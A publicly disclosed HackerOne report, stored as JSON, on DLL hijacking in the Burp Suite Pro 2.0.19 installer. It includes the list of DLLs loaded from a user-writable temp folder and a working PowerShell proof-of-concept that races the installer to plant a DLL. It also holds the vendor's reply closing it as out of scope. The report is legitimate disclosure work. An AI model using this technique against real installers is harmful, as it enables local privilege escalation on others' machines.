{"id":518837,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTg4Mzc=","url":"https://hackerone.com/reports/518837","title":"DLL Hijacking in Burp Suite Pro 2.0.19 Installer","state":"Closed","substate":"informative","severity_rating":"medium","readable_substate":"Informative","created_at":"2019-03-29T18:35:16.531Z","submitted_at":"2019-03-29T18:35:16.531Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"freetom","url":"/freetom","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15252,"url":"https://hackerone.com/portswigger","handle":"portswigger","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"PortSwigger Web Security","twitter_handle":"Burp_Suite","website":"https://portswigger.net","about":"Burp Suite is the leading software for web security testing"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-04-01T09:37:11.444Z","bug_reporter_agreed_on_going_public_at":"2019-04-01T09:31:33.669Z","team_member_agreed_on_going_public_at":"2019-04-01T09:37:11.382Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I've found that the latest installer of Burp Suite Pro tries to load some DLLs from an unprotected folder. After providing it with admin privileges (required to install) it tries to load these DLLs:\n\n```\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WINMM.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WSOCK32.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\VERSION.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WINMMBASE.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\DBGHELP.DLL\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\dbgcore.DLL\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjava.base-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjava.logging-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.compiler-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.scripting.nashorn-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.internal.vm.ci-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.internal.vm.compiler-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WINHTTP.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\urlmon.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\iertutil.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\CRYPTBASE.DLL\n```\n\n`e4jA5E5.tmp_dir1553882416` is a temporary folder that is created just in time by the installer but its ACL doesn't protect it from modifications by the current user. The folder is dynamically created, though there is a time window in which a local attacker (that has a program running as the current user but looks for escalating privileges for persistence, etc.) can find the folder and inject a DLL and get code execution as admin.\n\nI created the following script to exploit the issue:\n\n```\n$output = \"\"\nwhile(!$output){\n        Start-Sleep -milliseconds 10\n        $output = Get-process | where {$_.ProcessName -like 'burpsuite_pro_windows-x64*'}\n}\nStart-Sleep -milliseconds 1000\n$f = (Get-ChildItem -Filter \"*tmp_dir*\" C:\\Users\\bortto\\AppData\\Local\\Temp\\ | ?{ $_.PSIsContainer } | Sort CreationTime -Descending | Select -First 1).Name.trim()\n\nWrite-Host \"$f\"\n\nCopy-Item -Path \"C:\\users\\bortto\\Downloads\\Project1.dll\" -Destination \"C:\\Users\\bortto\\AppData\\Local\\Temp\\$f\\jre\\bin\\DBGHELP.dll\"\n```\n\nI attach `Project1.dll` (is just a DLL that upon loading pops a message box with the current user). I compiled it myself.\n\nI also attach a video that shows the PoC running successfully (note: the few seconds of black screen are due to Windows UAC popup). I tested the video and is viewable with Windows Media Player.\n\n## Impact\n\nLocal Privilege Escalation","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":454676,"file_name":"Project1.dll","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/454/676/4dd75e2593a0f1d2ffdf31cc271d81b33c777682/Project1.dll?response-content-disposition=attachment%3B%20filename%3D%22Project1.dll%22%3B%20filename%2A%3DUTF-8%27%27Project1.dll\u0026response-content-type=application%2Fx-dosexec\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150850Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0d12dc7478924d2b7f8cdcf73655c60f6ff610c6c85a1ffde4f8a3ce1f98813a","file_size":125216,"type":"application/x-dosexec"},{"id":454677,"file_name":"privesc_burp.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/454/677/572084b37876315566bffe1d8cd64006e3003e41/privesc_burp.mp4?response-content-disposition=attachment%3B%20filename%3D%22privesc_burp.mp4%22%3B%20filename%2A%3DUTF-8%27%27privesc_burp.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150850Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=319371d19f674ab8d14196879f8babd8a038cbfbc2d6b757bc1a3d66447b5ab2","file_size":1788474,"type":"video/mp4"}],"allow_singular_disclosure_at":null,"vote_count":16,"voters":["sameerphad72","khizer47","olegeekk","kaunghtetzaw","iamcoolcat","blueboy33","elliott-io","radarsardar","jillianhax","qwertmcgurt","and 6 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":169,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"Burp Suite Pro/Community","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4422723,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note the PoC is against the 64 bit installer (I don't have a 32 bit installer to test it..)","automated_response":false,"created_at":"2019-03-29T18:37:27.820Z","updated_at":"2019-03-29T18:37:27.820Z","actor":{"username":"freetom","cleared":false,"url":"/freetom","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4430823,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for your report. Unfortunately as our threat model assumes that the local machine is trusted we are only interested in DLL hijacking via DLLs located in the same folder as the installer (as it's likely to be a 'downloads' folder, and therefore contain untrusted files). \n\nApologies for not making the brief clearer on this count; I should have foreseen that the installer might have DLL hijacking in a temporary directory. I'll reword it now to avoid wasting anyone else's time.","automated_response":false,"created_at":"2019-04-01T08:37:58.773Z","updated_at":"2019-04-01T08:37:58.773Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4431230,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sincerely, from your policy program it's not clear that temporary folders are not included. Regarding DLL hijacking you say: \"This does not include post-installation files as they are launched from a trusted folder.\" \nIf that was a trusted folder then there would be no privilege escalation.\n\nFlagging this as Informative disappoints me more as this is a funny PE issue!\nAm I going to get any reward?\nOr make it public, at least? \n","automated_response":false,"created_at":"2019-04-01T08:53:36.970Z","updated_at":"2019-04-01T08:53:36.970Z","actor":{"username":"freetom","cleared":false,"url":"/freetom","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4431504,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree the policy could have been clearer, which is why now I've amended it to\n\u003e DLL hijacking on the Burp Suite installer, on fully patched Windows 7/8.1/10. This only applies to DLLs dropped in the Downloads folder, and other folders a remote unauthenticated attacker plausibly has access to.\n\nI've also added 'Local privilege escalation' as an example of a low-severity issue we're not interested in.\n\nFeel free to request disclosure.","automated_response":false,"created_at":"2019-04-01T09:05:11.001Z","updated_at":"2019-04-01T09:05:11.001Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4431651,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-01T09:31:33.697Z","updated_at":"2019-04-01T09:31:33.697Z","first_to_agree":true,"actor":{"username":"freetom","cleared":false,"url":"/freetom","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4431679,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-01T09:37:11.411Z","updated_at":"2019-04-01T09:37:11.411Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4431680,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-01T09:37:11.462Z","updated_at":"2019-04-01T09:37:11.462Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}